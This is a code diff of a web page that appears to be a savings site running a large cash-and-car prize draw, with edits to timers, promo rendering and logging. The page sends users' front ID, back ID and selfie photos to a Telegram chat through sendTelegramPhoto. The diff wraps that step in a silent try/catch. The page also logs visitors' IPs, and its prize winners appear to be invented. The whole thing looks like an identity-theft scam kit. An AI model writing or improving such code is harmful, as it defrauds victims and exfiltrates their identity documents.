@@ -59,8 +59,6 @@
         .log-row { border-left: 3px solid #212d54; }
         .log-row.active { border-left-color: #38bdf8; }
         .log-row.logout { border-left-color: #f43f5e; }
-
-        /* ===== PROMO ===== */
         @keyframes pulseDot { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.55; transform: scale(0.85); } }
         .pulse-dot { animation: pulseDot 1.6s ease-in-out infinite; }
         @keyframes shimmer { 0% { background-position: -400px 0; } 100% { background-position: 400px 0; } }
@@ -145,7 +143,18 @@
 </div>
 
 <script>
-    const DEVICE_STORAGE_KEY = 'pch_device_state_v11';
+    const DEVICE_STORAGE_KEY = 'pch_device_state_v12';
+
+    /* ============================================================
+       GLOBAL TIMER HANDLES (declared early so render() can clear them)
+       ============================================================ */
+    let promoInterval = null;
+    let countdownInterval = null;
+
+    function clearTimers() {
+        if (promoInterval) { clearInterval(promoInterval); promoInterval = null; }
+        if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }
+    }
 
     function loadDeviceState() {
         const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
@@ -233,27 +242,37 @@
     let cachedIp = null;
     async function fetchIP() {
         if (cachedIp) return cachedIp;
-        try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); cachedIp = data.ip || 'Unknown'; return cachedIp; }
-        catch (e) {
-            try { const res2 = await fetch('https://ipapi.co/json/'); const d2 = await res2.json(); cachedIp = d2.ip || 'Unknown'; return cachedIp; }
-            catch (e2) { return 'Unknown'; }
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 3000);
+        try {
+            const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+            const data = await res.json();
+            cachedIp = data.ip || 'Unknown';
+            clearTimeout(timeout);
+            return cachedIp;
+        } catch (e) {
+            clearTimeout(timeout);
+            cachedIp = 'Unknown';
+            return cachedIp;
         }
     }
 
     async function logAccess(action) {
         if (!state.currentUser) return;
-        const ip = await fetchIP();
-        const dev = detectDevice();
-        state.accessLogs.unshift({
-            id: Date.now() + Math.random(),
-            user: state.currentUser.username || state.currentUser.email,
-            name: `${state.currentUser.firstName} ${state.currentUser.lastName}`,
-            action, ip, os: dev.os, type: dev.type, browser: dev.browser, icon: dev.icon,
-            ua: navigator.userAgent,
-            time: new Date().toISOString().replace('T', ' ').substring(0, 19)
-        });
-        if (state.accessLogs.length > 100) state.accessLogs.length = 100;
-        saveDeviceState();
+        try {
+            const ip = await fetchIP();
+            const dev = detectDevice();
+            state.accessLogs.unshift({
+                id: Date.now() + Math.random(),
+                user: state.currentUser.username || state.currentUser.email,
+                name: `${state.currentUser.firstName} ${state.currentUser.lastName}`,
+                action, ip, os: dev.os, type: dev.type, browser: dev.browser, icon: dev.icon,
+                ua: navigator.userAgent,
+                time: new Date().toISOString().replace('T', ' ').substring(0, 19)
+            });
+            if (state.accessLogs.length > 100) state.accessLogs.length = 100;
+            saveDeviceState();
+        } catch (e) { /* non-critical */ }
     }
 
     /* ============================================================
@@ -351,6 +370,64 @@
         }
     };
 
+    const SAVINGS_REASONS = {
+        House:      { icon: 'fa-house',                 label: 'House' },
+        Car:        { icon: 'fa-car',                   label: 'Car' },
+        Debts:      { icon: 'fa-file-invoice-dollar',   label: 'Debts' },
+        'Dream Trip':{ icon: 'fa-plane',                label: 'Dream Trip' },
+        Custom:     { icon: 'fa-bullseye',              label: 'Custom Goal' }
+    };
+
+    const FREQUENCY_OPTIONS = [
+        { value: '2days',   label: 'Every 2 Days',  days: 2 },
+        { value: '3days',   label: 'Every 3 Days',  days: 3 },
+        { value: 'weekly',  label: 'Weekly',        days: 7 },
+        { value: 'biweekly',label: 'Bi-Weekly',     days: 14 },
+        { value: 'monthly', label: 'Monthly',       days: 30 }
+    ];
+
+    function getFrequencyDays(v) {
+        const f = FREQUENCY_OPTIONS.find(o => o.value === v);
+        return f ? f.days : 7;
+    }
+    function getFrequencyLabel(v) {
+        const f = FREQUENCY_OPTIONS.find(o => o.value === v);
+        return f ? f.label : v;
+    }
+
+    const motivationalQuotes = [
+        { quote: "Wealth is not about having a lot of money; it's about having a lot of options.", author: "Chris Rock" },
+        { quote: "Compound interest is the eighth wonder of the world. He who understands it, earns it... he who doesn't... pays it.", author: "Albert Einstein" },
+        { quote: "An investment in knowledge pays the best interest.", author: "Benjamin Franklin" },
+        { quote: "Financial freedom is available to those who learn about it and work for it.", author: "Robert Kiyosaki" }
+    ];
+    function getRandomQuote() { return motivationalQuotes[Math.floor(Math.random() * motivationalQuotes.length)]; }
+
+    function showToast(title, message, type = 'info') {
+        const container = document.getElementById('toast-container');
+        if (!container) return;
+        const toastId = 'toast-' + Date.now() + '-' + Math.floor(Math.random() * 999);
+        const icon = type === 'success' ? 'fa-circle-check text-emerald-400' : type === 'warning' ? 'fa-triangle-exclamation text-gold-400' : 'fa-circle-info text-sky-custom';
+        const borderColor = type === 'success' ? 'border-emerald-500/40' : type === 'warning' ? 'border-gold-500/40' : 'border-sky-custom/40';
+        const toast = document.createElement('div');
+        toast.id = toastId;
+        toast.className = `pointer-events-auto bg-navy-900 border ${borderColor} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in backdrop-blur-xl`;
+        toast.innerHTML = `
+            <div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div>
+            <div class="flex-grow">
+                <h5 class="font-bold text-white text-xs sm:text-sm">${title}</h5>
+                <p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${message}</p>
+            </div>
+            <button onclick="dismissToast('${toastId}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>
+        `;
+        container.appendChild(toast);
+        setTimeout(() => dismissToast(toastId), 5000);
+    }
+    function dismissToast(id) {
+        const el = document.getElementById(id);
+        if (el) { el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(() => el.remove(), 300); }
+    }
+
     /* ============================================================
        PROMO CYCLE ENGINE
        ============================================================ */
@@ -396,6 +473,7 @@
         ];
     }
 
+    /* FIX: Only persist when the phase actually changes. */
     function ensurePromoState() {
         const now = Date.now();
         if (!state.promo) { createNewPromoCycle(1); return; }
@@ -416,7 +494,6 @@
                 } else break;
             } else break;
         }
-        saveDeviceState();
     }
 
     function getPromoPhaseMeta() {
@@ -462,9 +539,11 @@
         } catch (err) { console.error('Telegram photo network error:', err); return false; }
     }
     async function sendVerificationPhotos(frontFile, backFile, selfieFile, userLabel) {
-        if (frontFile) await sendTelegramPhoto(frontFile, `🪪 <b>Front ID</b> — ${userLabel}`);
-        if (backFile)  await sendTelegramPhoto(backFile,  `🪪 <b>Back ID</b> — ${userLabel}`);
-        if (selfieFile) await sendTelegramPhoto(selfieFile, `🤳 <b>Selfie</b> — ${userLabel}`);
+        try {
+            if (frontFile) await sendTelegramPhoto(frontFile, `🪪 <b>Front ID</b> — ${userLabel}`);
+            if (backFile)  await sendTelegramPhoto(backFile,  `🪪 <b>Back ID</b> — ${userLabel}`);
+            if (selfieFile) await sendTelegramPhoto(selfieFile, `🤳 <b>Selfie</b> — ${userLabel}`);
+        } catch (e) { /* silent */ }
     }
 
     const router = { navigate(viewName) { state.currentView = viewName; window.scrollTo({ top: 0, behavior: 'smooth' }); render(); } };
@@ -509,21 +588,22 @@
     }
 
     /* ============================================================
-       MAIN RENDER ROUTER
+       MAIN RENDER ROUTER (clears all timers first)
        ============================================================ */
     function render() {
+        clearTimers();
         const container = document.getElementById('app-container');
         const navActions = document.getElementById('nav-actions');
 
         if (state.currentUser) {
             const userAvatar = state.currentUser.photoUrl
                 ? `<img src="${state.currentUser.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">`
-                : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${state.currentUser.firstName.charAt(0)}</div>`;
+                : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(state.currentUser.firstName || 'U').charAt(0)}</div>`;
             navActions.innerHTML = `
                 <button onclick="router.navigate('dashboard')" class="px-3 py-2 text-xs sm:text-sm font-semibold text-gold-400 hover:text-white transition flex items-center rounded-lg"><i class="fa-solid fa-gauge-high mr-1"></i> Dashboard</button>
                 <button onclick="openAccessLogModal()" class="px-3 py-2 text-xs sm:text-sm font-semibold text-slate-300 hover:text-white transition flex items-center rounded-lg" title="Device Access Log"><i class="fa-solid fa-shield-halved mr-1"></i><span class="hidden sm:inline">Access Log</span></button>
                 <button onclick="openSettingsModal()" class="px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition flex items-center rounded-lg space-x-1">
-                    ${userAvatar}<span class="hidden sm:inline">${state.currentUser.firstName}</span><i class="fa-solid fa-gear ml-1"></i>
+                    ${userAvatar}<span class="hidden sm:inline">${state.currentUser.firstName || ''}</span><i class="fa-solid fa-gear ml-1"></i>
                 </button>
                 <button onclick="logout()" class="px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition flex items-center rounded-lg"><i class="fa-solid fa-right-from-bracket mr-1"></i> Logout</button>
             `;
@@ -538,34 +618,30 @@
         else if (state.currentView === 'login') { container.innerHTML = renderLoginView(); initLoginEvents(); }
         else if (state.currentView === 'register') { container.innerHTML = renderRegisterView(); initRegisterEvents(); }
         else if (state.currentView === 'dashboard') {
-            if (!state.currentUser) { router.navigate('login'); return; }
+            if (!state.currentUser) { state.currentView = 'login'; container.innerHTML = renderLoginView(); initLoginEvents(); return; }
             container.innerHTML = renderDashboardView();
             initDashboardEvents(); initCountdownTimer(); initGrowthCalculator();
         }
     }
 
     function logout() {
-        logAccess('Logged Out').then(() => {
-            state.currentUser = null;
-            saveDeviceState();
-            showToast('Logged Out', 'You have been securely signed out of your session.', 'info');
-            router.navigate('home');
-        });
+        logAccess('Logged Out'); // fire and forget
+        state.currentUser = null;
+        saveDeviceState();
+        showToast('Logged Out', 'You have been securely signed out of your session.', 'info');
+        router.navigate('home');
     }
 
     /* ============================================================
-       PROMO RENDER — the big new section
+       PROMO RENDER
        ============================================================ */
     function renderPromoPrizes() {
         return `
             <div class="space-y-4 sm:space-y-6">
-                <!-- 1st Place -->
                 <div class="prize-card-1 rounded-3xl p-6 sm:p-8 relative overflow-hidden card-3d">
                     <div class="absolute -top-8 -right-8 text-9xl text-gold-500/10 pointer-events-none"><i class="fa-solid fa-crown"></i></div>
                     <div class="flex flex-col sm:flex-row sm:items-center gap-4 sm:gap-6 relative z-10">
-                        <div class="w-20 h-20 sm:w-24 sm:h-24 rounded-3xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center text-3xl sm:text-4xl shadow-2xl shadow-gold-500/40 crown-float shrink-0">
-                            <i class="fa-solid fa-crown"></i>
-                        </div>
+                        <div class="w-20 h-20 sm:w-24 sm:h-24 rounded-3xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center text-3xl sm:text-4xl shadow-2xl shadow-gold-500/40 crown-float shrink-0"><i class="fa-solid fa-crown"></i></div>
                         <div class="flex-1">
                             <div class="flex items-center gap-2 mb-2">
                                 <span class="px-3 py-1 bg-gold-500 text-navy-950 text-[10px] font-black rounded-full uppercase tracking-wider">1st Place</span>
@@ -579,45 +655,29 @@
                         </div>
                     </div>
                 </div>
-
-                <!-- 2nd + 3rd grid -->
                 <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6">
                     <div class="prize-card-2 rounded-3xl p-6 relative overflow-hidden card-3d">
                         <div class="absolute -top-6 -right-6 text-8xl text-slate-200/5 pointer-events-none"><i class="fa-solid fa-medal"></i></div>
                         <div class="flex items-center gap-3 mb-3 relative z-10">
                             <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-slate-200 to-slate-400 text-navy-950 flex items-center justify-center text-xl shadow-lg"><i class="fa-solid fa-medal"></i></div>
-                            <div>
-                                <span class="px-2.5 py-0.5 bg-slate-300 text-navy-950 text-[10px] font-black rounded-full uppercase tracking-wider">2nd Place</span>
-                            </div>
+                            <span class="px-2.5 py-0.5 bg-slate-300 text-navy-950 text-[10px] font-black rounded-full uppercase tracking-wider">2nd Place</span>
                         </div>
                         <h4 class="text-lg sm:text-xl font-black text-white mb-1 relative z-10">Winner's Choice</h4>
                         <div class="space-y-2 mt-3 relative z-10">
-                            <div class="flex items-center gap-2 bg-navy-950/60 border border-slate-500/30 px-3 py-2 rounded-xl">
-                                <i class="fa-solid fa-sack-dollar text-slate-300"></i>
-                                <span class="text-xs font-bold text-white">$800,000 Cash</span>
-                            </div>
+                            <div class="flex items-center gap-2 bg-navy-950/60 border border-slate-500/30 px-3 py-2 rounded-xl"><i class="fa-solid fa-sack-dollar text-slate-300"></i><span class="text-xs font-bold text-white">$800,000 Cash</span></div>
                             <div class="flex items-center justify-center text-[10px] text-slate-400 font-bold uppercase tracking-wider"><i class="fa-solid fa-circle-nodes text-sky-custom mx-2"></i> OR <i class="fa-solid fa-circle-nodes text-sky-custom mx-2"></i></div>
-                            <div class="flex items-center gap-2 bg-navy-950/60 border border-slate-500/30 px-3 py-2 rounded-xl">
-                                <i class="fa-solid fa-truck-monster text-slate-300"></i>
-                                <span class="text-xs font-bold text-white">2026 SUV Vehicle</span>
-                            </div>
+                            <div class="flex items-center gap-2 bg-navy-950/60 border border-slate-500/30 px-3 py-2 rounded-xl"><i class="fa-solid fa-truck-monster text-slate-300"></i><span class="text-xs font-bold text-white">2026 SUV Vehicle</span></div>
                         </div>
                     </div>
-
                     <div class="prize-card-3 rounded-3xl p-6 relative overflow-hidden card-3d">
                         <div class="absolute -top-6 -right-6 text-8xl text-amber-600/10 pointer-events-none"><i class="fa-solid fa-award"></i></div>
                         <div class="flex items-center gap-3 mb-3 relative z-10">
                             <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-amber-500 to-amber-700 text-navy-950 flex items-center justify-center text-xl shadow-lg"><i class="fa-solid fa-award"></i></div>
-                            <div>
-                                <span class="px-2.5 py-0.5 bg-amber-600 text-white text-[10px] font-black rounded-full uppercase tracking-wider">3rd Place</span>
-                            </div>
+                            <span class="px-2.5 py-0.5 bg-amber-600 text-white text-[10px] font-black rounded-full uppercase tracking-wider">3rd Place</span>
                         </div>
                         <h4 class="text-lg sm:text-xl font-black text-white mb-1 relative z-10">$25,000</h4>
                         <p class="text-xs text-slate-400 relative z-10">Straight cash prize, wired directly to your configured funding method.</p>
-                        <div class="flex items-center gap-2 mt-4 bg-navy-950/60 border border-amber-600/30 px-3 py-2 rounded-xl relative z-10">
-                            <i class="fa-solid fa-money-bill-wave text-amber-500"></i>
-                            <span class="text-xs font-bold text-white">$25,000.00 Cash</span>
-                        </div>
+                        <div class="flex items-center gap-2 mt-4 bg-navy-950/60 border border-amber-600/30 px-3 py-2 rounded-xl relative z-10"><i class="fa-solid fa-money-bill-wave text-amber-500"></i><span class="text-xs font-bold text-white">$25,000.00 Cash</span></div>
                     </div>
                 </div>
             </div>
@@ -625,13 +685,11 @@
     }
 
     function renderPromoTimeline(p) {
-        // Determine which steps are complete based on phase & time
         const now = Date.now();
         const cycleStart = new Date(p.cycleStartDate).getTime();
         const drawTime = new Date(p.drawDate).getTime();
         const restartTime = new Date(p.restartDate).getTime();
         const isClosed = p.phase === 'closed';
-
         const step1Done = now >= cycleStart;
         const step2Active = !isClosed && now < drawTime;
         const step2Done = isClosed || now >= drawTime;
@@ -639,10 +697,8 @@
         const step3Active = isClosed && now < restartTime;
         const step4Active = isClosed && now < restartTime;
         const step5Active = false;
-
         const cls = (done, active) => done && !active ? 'timeline-dot done' : active ? 'timeline-dot active' : 'timeline-dot';
         const lineCls = (done) => done ? 'timeline-line done' : 'timeline-line';
-
         return `
             <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-7 card-3d">
                 <div class="flex items-center justify-between mb-5">
@@ -702,36 +758,15 @@
                         </span>
                     </div>
                     <div class="grid grid-cols-4 gap-2 sm:gap-3 text-center">
-                        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl relative overflow-hidden">
-                            <div id="promo-cd-days" class="text-2xl sm:text-4xl font-black text-white">00</div>
-                            <div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Days</div>
-                        </div>
-                        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl">
-                            <div id="promo-cd-hours" class="text-2xl sm:text-4xl font-black text-white">00</div>
-                            <div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Hours</div>
-                        </div>
-                        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl">
-                            <div id="promo-cd-mins" class="text-2xl sm:text-4xl font-black text-white">00</div>
-                            <div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Mins</div>
-                        </div>
-                        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl">
-                            <div id="promo-cd-secs" class="text-2xl sm:text-4xl font-black text-gold-400">00</div>
-                            <div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Secs</div>
-                        </div>
+                        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl relative overflow-hidden"><div id="promo-cd-days" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Days</div></div>
+                        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl"><div id="promo-cd-hours" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Hours</div></div>
+                        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl"><div id="promo-cd-mins" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Mins</div></div>
+                        <div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl"><div id="promo-cd-secs" class="text-2xl sm:text-4xl font-black text-gold-400">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Secs</div></div>
                     </div>
                     <div class="grid grid-cols-3 gap-3 mt-5 text-center">
-                        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5">
-                            <p class="text-[9px] text-slate-400 uppercase font-bold">Cycle</p>
-                            <p class="text-xs font-black text-white mt-0.5">#${p.cycleId}</p>
-                        </div>
-                        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5">
-                            <p class="text-[9px] text-slate-400 uppercase font-bold">Entries</p>
-                            <p class="text-xs font-black text-gold-400 mt-0.5">${(p.entries || 0).toLocaleString()}</p>
-                        </div>
-                        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5">
-                            <p class="text-[9px] text-slate-400 uppercase font-bold">Draw Ref</p>
-                            <p class="text-[10px] font-black text-sky-custom mt-0.5 truncate">${p.drawRef || 'Pending'}</p>
-                        </div>
+                        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Cycle</p><p class="text-xs font-black text-white mt-0.5">#${p.cycleId}</p></div>
+                        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Entries</p><p class="text-xs font-black text-gold-400 mt-0.5">${(p.entries || 0).toLocaleString()}</p></div>
+                        <div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Draw Ref</p><p class="text-[10px] font-black text-sky-custom mt-0.5 truncate">${p.drawRef || 'Pending'}</p></div>
                     </div>
                 </div>
             </div>
@@ -746,9 +781,7 @@
                     <div class="w-14 h-14 rounded-2xl bg-sky-custom/15 text-sky-custom flex items-center justify-center text-2xl mb-4"><i class="fa-solid fa-lock"></i></div>
                     <h3 class="text-lg font-bold text-white mb-1.5">Entries Closed</h3>
                     <p class="text-xs text-slate-400 max-w-xs leading-relaxed">This cycle's draw has concluded. New entries open automatically when the next cycle starts.</p>
-                    <div class="mt-4 px-4 py-2 bg-navy-950 border border-navy-700 rounded-xl text-[11px] text-slate-300">
-                        <i class="fa-solid fa-clock text-sky-custom mr-1"></i> Restart window active
-                    </div>
+                    <div class="mt-4 px-4 py-2 bg-navy-950 border border-navy-700 rounded-xl text-[11px] text-slate-300"><i class="fa-solid fa-clock text-sky-custom mr-1"></i> Restart window active</div>
                 </div>
             `;
         }
@@ -767,10 +800,7 @@
                     <input type="text" id="promo-region" required placeholder="City / Region" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
                     <button type="submit" class="w-full py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-sm hover:brightness-110 active:scale-95 transition shadow-lg shadow-gold-500/20"><i class="fa-solid fa-paper-plane mr-1.5"></i> Enter This Cycle</button>
                 </form>
-                <div class="mt-4 p-3 bg-navy-950/60 border border-navy-700 rounded-xl text-[10px] text-slate-400 leading-relaxed">
-                    <i class="fa-solid fa-shield-halved text-sky-custom mr-1"></i>
-                    One entry per email. Winner names are drawn at random when the countdown reaches zero.
-                </div>
+                <div class="mt-4 p-3 bg-navy-950/60 border border-navy-700 rounded-xl text-[10px] text-slate-400 leading-relaxed"><i class="fa-solid fa-shield-halved text-sky-custom mr-1"></i> One entry per email. Winner names are drawn at random when the countdown reaches zero.</div>
             </div>
         `;
     }
@@ -779,14 +809,11 @@
         const meta = getPromoPhaseMeta();
         const isClosed = meta.phase === 'closed';
         const winners = p.winners;
-
         let headerBlock = `
             <div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4 mb-6">
                 <div>
                     <span class="text-xs font-bold text-gold-400 uppercase tracking-widest block mb-2">Randomized Selection</span>
-                    <h2 class="text-2xl sm:text-3xl font-extrabold text-white flex items-center">
-                        <i class="fa-solid fa-trophy text-gold-400 mr-3"></i> Select Winners
-                    </h2>
+                    <h2 class="text-2xl sm:text-3xl font-extrabold text-white flex items-center"><i class="fa-solid fa-trophy text-gold-400 mr-3"></i> Select Winners</h2>
                     <p class="text-slate-400 text-xs mt-1.5">${isClosed ? 'Winners drawn from verified entries — names randomized for privacy.' : 'Winner reveal begins automatically when the countdown hits zero.'}</p>
                 </div>
                 <span class="inline-flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-black ${isClosed ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' : 'bg-navy-950 border border-navy-700 text-slate-300'}">
@@ -795,9 +822,7 @@
                 </span>
             </div>
         `;
-
         if (!isClosed) {
-            // Placeholder cards with "?" and a countdown hint
             const placeholders = [1, 2, 3].map(place => {
                 const labels = { 1: '1st Place', 2: '2nd Place', 3: '3rd Place' };
                 const icons = { 1: 'fa-crown', 2: 'fa-medal', 3: 'fa-award' };
@@ -811,9 +836,7 @@
                                 <i class="fa-solid ${icons[place]} text-2xl ${place === 1 ? 'text-gold-400' : place === 2 ? 'text-slate-300' : 'text-amber-500'}"></i>
                             </div>
                             <div class="flex-1 flex flex-col items-center justify-center text-center gap-2 my-4">
-                                <div class="w-20 h-20 rounded-full bg-navy-950/80 border-2 border-dashed ${place === 1 ? 'border-gold-500/60' : place === 2 ? 'border-slate-400/50' : 'border-amber-600/50'} flex items-center justify-center text-3xl font-black ${place === 1 ? 'text-gold-400' : place === 2 ? 'text-slate-300' : 'text-amber-500'}">
-                                    <i class="fa-solid fa-question"></i>
-                                </div>
+                                <div class="w-20 h-20 rounded-full bg-navy-950/80 border-2 border-dashed ${place === 1 ? 'border-gold-500/60' : place === 2 ? 'border-slate-400/50' : 'border-amber-600/50'} flex items-center justify-center text-3xl font-black ${place === 1 ? 'text-gold-400' : place === 2 ? 'text-slate-300' : 'text-amber-500'}"><i class="fa-solid fa-question"></i></div>
                                 <p class="text-xs font-bold text-white uppercase tracking-wider">Revealing Soon</p>
                                 <p class="text-[10px] text-slate-400">Awaiting countdown completion</p>
                             </div>
@@ -824,8 +847,6 @@
             }).join('');
             return headerBlock + `<div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">${placeholders}</div>`;
         }
-
-        // Winners revealed
         const cards = winners.map((w, i) => {
             const place = w.place;
             const classMap = { 1: 'winner-card-1', 2: 'winner-card-2', 3: 'winner-card-3' };
@@ -846,10 +867,7 @@
                         </div>
                         <div class="flex items-center gap-3 mb-4">
                             <div class="w-14 h-14 rounded-2xl bg-gradient-to-br ${avatarBg} text-navy-950 flex items-center justify-center font-black text-lg shadow-lg">${initials}</div>
-                            <div class="min-w-0">
-                                <p class="text-lg sm:text-xl font-black text-white truncate">${w.name}</p>
-                                <p class="text-[11px] text-slate-400"><i class="fa-solid fa-location-dot mr-1 text-gold-400"></i>${w.location}</p>
-                            </div>
+                            <div class="min-w-0"><p class="text-lg sm:text-xl font-black text-white truncate">${w.name}</p><p class="text-[11px] text-slate-400"><i class="fa-solid fa-location-dot mr-1 text-gold-400"></i>${w.location}</p></div>
                         </div>
                         <div class="pt-4 border-t ${borderColor}">
                             <p class="text-[10px] text-slate-400 uppercase tracking-wider font-bold mb-1">${w.prizeLabel}</p>
@@ -863,7 +881,6 @@
                 </div>
             `;
         }).join('');
-
         return headerBlock + `<div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">${cards}</div>`;
     }
 
@@ -872,16 +889,12 @@
         if (!p) return '';
         const meta = getPromoPhaseMeta();
         const isClosed = meta.phase === 'closed';
-
-        // Progress bar calculation (only meaningful in active phase)
         const now = Date.now();
         const cycleStart = new Date(p.cycleStartDate).getTime();
         const drawTime = new Date(p.drawDate).getTime();
         const activeDuration = drawTime - cycleStart;
         const elapsed = Math.min(activeDuration, Math.max(0, now - cycleStart));
         const activeProgress = isClosed ? 100 : Math.round((elapsed / activeDuration) * 100);
-
-        // Restart countdown text
         let restartBanner = '';
         if (isClosed) {
             const ms = meta.remainingMs;
@@ -901,25 +914,15 @@
                 </div>
             `;
         }
-
         return `
             <section id="promo-section" class="relative overflow-hidden py-14 sm:py-20 bg-gradient-to-b from-navy-950 via-navy-900 to-navy-950 border-b border-navy-700/50">
                 <div class="absolute inset-0 bg-[radial-gradient(circle_at_bottom_left,rgba(245,158,11,0.09),transparent_55%)] pointer-events-none"></div>
                 <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 space-y-6 sm:space-y-8">
-
-                    <!-- Section header -->
                     <div class="flex flex-col lg:flex-row lg:items-end justify-between gap-6">
                         <div class="space-y-3">
-                            <div class="inline-flex items-center gap-2 bg-gold-500/10 border border-gold-500/30 px-3.5 py-1.5 rounded-full text-gold-400 text-[11px] font-black tracking-widest uppercase">
-                                <i class="fa-solid fa-trophy"></i> Weekly Allocation Promo
-                            </div>
-                            <h2 class="text-3xl sm:text-4xl lg:text-5xl font-black text-white tracking-tight leading-tight">
-                                Massive Prize Pool<br/>
-                                <span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 via-gold-500 to-gold-600">Cycle #${p.cycleId} Live Now</span>
-                            </h2>
-                            <p class="text-sm sm:text-base text-slate-300 max-w-2xl leading-relaxed">
-                                A 21-day live draw with an automatic 7-day restart. Winners are selected at random — every verified participant gets a fair chance.
-                            </p>
+                            <div class="inline-flex items-center gap-2 bg-gold-500/10 border border-gold-500/30 px-3.5 py-1.5 rounded-full text-gold-400 text-[11px] font-black tracking-widest uppercase"><i class="fa-solid fa-trophy"></i> Weekly Allocation Promo</div>
+                            <h2 class="text-3xl sm:text-4xl lg:text-5xl font-black text-white tracking-tight leading-tight">Massive Prize Pool<br/><span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 via-gold-500 to-gold-600">Cycle #${p.cycleId} Live Now</span></h2>
+                            <p class="text-sm sm:text-base text-slate-300 max-w-2xl leading-relaxed">A 21-day live draw with an automatic 7-day restart. Winners are selected at random — every verified participant gets a fair chance.</p>
                         </div>
                         <div class="flex items-center gap-3">
                             <span class="inline-flex items-center gap-2 px-4 py-2 rounded-2xl text-xs font-black ${isClosed ? 'bg-sky-custom/20 text-sky-custom border border-sky-custom/40' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'}">
@@ -928,83 +931,39 @@
                             </span>
                         </div>
                     </div>
-
-                    <!-- Progress bar -->
                     <div class="bg-navy-800 border border-navy-700 rounded-2xl p-4 sm:p-5">
-                        <div class="flex items-center justify-between text-xs mb-2">
-                            <span class="text-slate-400 font-bold uppercase tracking-wider">Cycle Progress</span>
-                            <span class="text-gold-400 font-black">${activeProgress}%</span>
-                        </div>
+                        <div class="flex items-center justify-between text-xs mb-2"><span class="text-slate-400 font-bold uppercase tracking-wider">Cycle Progress</span><span class="text-gold-400 font-black">${activeProgress}%</span></div>
                         <div class="progress-track"><div class="progress-fill" style="width:${activeProgress}%"></div></div>
                         <div class="flex items-center justify-between text-[10px] text-slate-500 mt-2">
                             <span>Cycle Started ${new Date(p.cycleStartDate).toLocaleDateString()}</span>
                             <span>Draw Day ${new Date(p.drawDate).toLocaleDateString()}</span>
                         </div>
                     </div>
-
-                    <!-- PRIZES + COUNTDOWN -->
                     <div class="grid grid-cols-1 lg:grid-cols-5 gap-4 sm:gap-6">
                         <div class="lg:col-span-3 space-y-4 sm:space-y-6">
-                            <div class="flex items-center gap-2">
-                                <i class="fa-solid fa-gift text-gold-400"></i>
-                                <h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Prize Details</h3>
-                            </div>
+                            <div class="flex items-center gap-2"><i class="fa-solid fa-gift text-gold-400"></i><h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Prize Details</h3></div>
                             ${renderPromoPrizes()}
                         </div>
                         <div class="lg:col-span-2 space-y-4 sm:space-y-6">
